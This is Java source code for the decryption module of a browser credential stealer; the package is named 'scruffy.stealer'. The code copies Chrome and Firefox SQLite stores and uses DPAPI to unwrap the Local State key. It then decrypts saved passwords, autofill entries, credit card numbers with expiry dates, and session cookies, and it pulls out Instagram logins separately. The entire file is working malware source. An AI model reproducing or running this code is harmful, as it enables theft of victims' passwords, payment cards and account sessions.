package scruffy.stealer.utils.decrypt;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.io.FileUtils;

import com.github.windpapi4j.WinDPAPI;
import com.github.windpapi4j.WinDPAPI.CryptProtectFlag;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

public class decrypt_manager {

    public static int 
    	autoFillsCount, 
    	passwordsCount, 
    	cardsCount, 
    	cookiesCount;
    
    public static List<String> 
    	instagram_accounts,
    	data;

    public String getAutofills(String path) {
        try {
        	if (!Files.exists(Paths.get(path))) 
        		return "";

            Path tempFile = Files.createTempFile("temp", ".db");
            Files.copy(new File(path).toPath(), tempFile, java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            Class.forName("org.sqlite.JDBC");
            Connection connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.toString());
            Statement statement = connection.createStatement();
            statement.setQueryTimeout(30);
            ResultSet set = statement.executeQuery("SELECT * FROM autofill");

            data.clear();
            while (set.next()) {
                data.add(set.getString(1) + ": " + set.getString(2));
            }
            
            data = data.stream().distinct().collect(Collectors.toList());
            Collections.sort(data, Comparator.comparingInt(String::length).reversed());
            autoFillsCount += data.size();

            FileUtils.delete(tempFile.toFile());
            connection.close();
            
            return get(data);
        } catch (Exception ignored) {}
        return "";
    }

    public String getPasswords(String path, String path1) {
        try {
        	if (!Files.exists(Paths.get(path)) || !Files.exists(Paths.get(path1))) 
        		return "";

            Path tempFile = Files.createTempFile("temp", ".db");
            Files.copy(new File(path).toPath(), tempFile, java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            Class.forName("org.sqlite.JDBC");
            Connection connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.toString());
            Statement statement = connection.createStatement();
            statement.setQueryTimeout(30);
            ResultSet set = statement.executeQuery("SELECT * FROM logins");

            data.clear();
            while (set.next()) {
                String pw = set.getString(1) + "\n" + set.getString(4) + " : " + decrypt(new File(path1), set.getBytes(6));
                if (!pw.split("\n")[1].split(":")[0].isEmpty() && !pw.split("\n")[1].split(":")[1].isEmpty() && !"empty".equals(pw.split("\n")[1].split(":")[1]) && pw.split("\n")[1].split(":")[1].length() > 3) {
                    data.add(pw + "\n");
                    if (set.getString(1).contains("instagram")) {
                    	instagram_accounts.add(set.getString(4) + ":" + decrypt(new File(path1), set.getBytes(6)));
                    }
                }
            }
            
            data = data.stream().distinct().collect(Collectors.toList());
            Collections.sort(data, Comparator.comparingInt(String::length).reversed());
            passwordsCount += data.size();

            FileUtils.delete(tempFile.toFile());
            connection.close();

            return get(data);
        } catch (Exception ignored) {}
        return "";
    }

    public String getCards(String path, String path1) {
        try {
        	if (!Files.exists(Paths.get(path)) || !Files.exists(Paths.get(path1))) 
        		return "";

            Path tempFile = Files.createTempFile("temp", ".db");
            Files.copy(new File(path).toPath(), tempFile, java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            Class.forName("org.sqlite.JDBC");
            Connection connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.toString());
            Statement statement = connection.createStatement();
            statement.setQueryTimeout(30);
            ResultSet set = statement.executeQuery("SELECT * FROM credit_cards");

            data.clear();
            while (set.next()) {
                if (decrypt(new File(path1), set.getBytes(5)) != null) {
                    String creditCard = decrypt(new File(path1), set.getBytes(5));
                    String expires = set.getString(3) + "/" + set.getString(4);

                    data.add(creditCard + "\n" + "Expires: " + expires + "\n");
                }
            }
            
            data = data.stream().distinct().collect(Collectors.toList());
            Collections.sort(data, Comparator.comparingInt(String::length).reversed());
            cardsCount += data.size();

            FileUtils.delete(tempFile.toFile());
            connection.close();

            return get(data);
        } catch (Exception ignored) {}
        return "";
    }

    public String getCookies(String path, String path1) {
        try {
            if (!Files.exists(Paths.get(path)) || !Files.exists(Paths.get(path1)))
                return "";

            Path tempFile = Files.createTempFile("temp", ".db");
            Files.copy(new File(path).toPath(), tempFile, java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            Class.forName("org.sqlite.JDBC");
            Connection connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.toString());
            Statement statement = connection.createStatement();
            statement.setQueryTimeout(30);
            ResultSet set = statement.executeQuery("SELECT * FROM cookies");

            data.clear();
            while (set.next()) {
                if (decrypt(new File(path1), set.getBytes("encrypted_value")) != null) {
                    String hostKey = set.getString("host_key");
                    String isSecure = set.getString("is_secure").toUpperCase();
                    String getPath = set.getString("path");
                    String isHttpOnly = set.getString("is_httponly").toUpperCase();
                    String value = decrypt(new File(path1), set.getBytes("encrypted_value"));

                    String cookie = hostKey + "\t" + isSecure + "\t" + getPath + "\t" + isHttpOnly + "\t" + "2597573456" + "\t" + set.getString(4) + "\t" + value;

                    if (!cookie.isEmpty() && !data.toString().contains("github.com/itzgonza"))
                        data.add("github.com/itzgonza\n");

                    data.add(cookie);
                }
            }
            data = data.stream().distinct().collect(Collectors.toList());
            Collections.sort(data, Comparator.comparingInt(String::length).reversed());
            cookiesCount += data.size();

            FileUtils.delete(tempFile.toFile());
            connection.close();

            return get(data);
        } catch (Exception ignored) {}
        return "";
    }

    public String getMozillaCookies(String path) {
        try {
            if (!Files.exists(Paths.get(path)))
                return "";

            Path tempFile = Files.createTempFile("temp", ".db");
            Files.copy(new File(path).toPath(), tempFile, java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            Class.forName("org.sqlite.JDBC");
            Connection connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.toString());
            Statement statement = connection.createStatement();
            statement.setQueryTimeout(30);
            ResultSet set = statement.executeQuery("SELECT * FROM moz_cookies");

            data.clear();
            while (set.next()) {
                if (set.getString(4) != null) {
                    String column1 = set.getString(5);
                    String column2 = set.getString(1).toUpperCase();
                    String column3 = "/";
                    String column4 = set.getString(2).toUpperCase();
                    String column5 = "2597573456";
                    String column6 = set.getString(3);
                    String column7 = set.getString(4);

                    String cookie = column1 + "\t" + column2 + "\t" + column3 + "\t" + column4 + "\t" + column5 + "\t" + column6 + "\t" + column7;

                    if (!cookie.isEmpty() && !data.toString().contains("github.com/itzgonza"))
                        data.add("github.com/itzgonza\n");

                    data.add(cookie);
                }
            }
            data = data.stream().distinct().collect(Collectors.toList());
            Collections.sort(data, Comparator.comparingInt(String::length).reversed());
            cookiesCount += data.size();

            FileUtils.delete(tempFile.toFile());
            connection.close();

            return get(data);
        } catch (Exception ignored) {}
        return "";
    }

    public static byte[] getDecryptBytes(byte[] input, byte[] key, byte[] iv) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, gcmParameterSpec);
        return cipher.doFinal(input);
    }

    public static String decrypt(File localState, byte[] encrypt) throws Exception {
        if (WinDPAPI.isPlatformSupported()) {
            WinDPAPI dpapi = WinDPAPI.newInstance(CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN);

            if (!(new String(encrypt).startsWith("v10") || new String(encrypt).startsWith("v11"))) {
                return "null";
            }

            if (!localState.exists()) {
                return "Local State is required";
            }

            String readLocalState = FileUtils.readFileToString(localState, "utf-8");
            JsonObject object = new JsonParser().parse(readLocalState).getAsJsonObject();
            String encryptedKey = object.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString();

            byte[] bs = Base64.getDecoder().decode(encryptedKey);
            if (!new String(bs).startsWith("DPAPI")) {
                return "Local State should start with DPAPI";
            }

            bs = Arrays.copyOfRange(bs, "DPAPI".length(), bs.length);
            byte[] keyBytes = dpapi.unprotectData(bs);

            if (keyBytes.length != 256 / 8) {
                return "Local State key length is wrong";
            }

            byte[] nonceBytes = Arrays.copyOfRange(encrypt, "V10".length(), "V10".length() + 96 / 8);
            encrypt = Arrays.copyOfRange(encrypt, "V10".length() + 96 / 8, encrypt.length);

            return new String(getDecryptBytes(encrypt, keyBytes, nonceBytes));
        }

        return "null";
    }

    public String get(List<String> list) {
        return String.join("\n", list);
    }

}